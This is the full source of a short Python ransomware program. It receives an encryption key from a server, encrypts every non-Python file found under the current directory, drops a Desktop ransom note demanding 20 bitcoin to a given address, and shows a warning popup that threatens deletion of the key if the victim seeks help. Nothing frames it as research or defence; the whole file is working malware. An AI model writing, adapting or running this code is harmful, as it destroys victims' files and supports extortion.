import socket
import subprocess
import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
SERVER="localhost"
PORT=12657
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER, PORT))
print("Connected")
key = client.recv(1024)
fernet = Fernet(key)
for dir_tuple in os.walk(os.getcwd()):
    for file in dir_tuple[2]:
        if not file.endswith('py'):
            with open(str(file), "rb") as f:
                data = f.read()
            with open(str(file), "wb") as f:
                f.write(fernet.encrypt(data))
with open(f"{os.environ.get('HOME')}/Desktop/README.txt","w") as f:
    f.write("All your files have been encrypted.\nYou can only decrypt them with a key that we have. To get the key transfer ₿20 to bitcoin address 11SAs3HwDkytKNHoOlaMJSoBW4EY3oy5Gm\nexpect us")
root = tk.Tk()
root.withdraw()
if messagebox.showwarning('???', 'All your files have been encrypted. Check your Desktop for README.txt for further instructions. Do not contact the authors in any way else the decryption key will be deleted.'):
    root.destroy()
    #subprocess.run(["shred",f"-n 5 -z {os.path.basename(__file__)}"])
root.mainloop()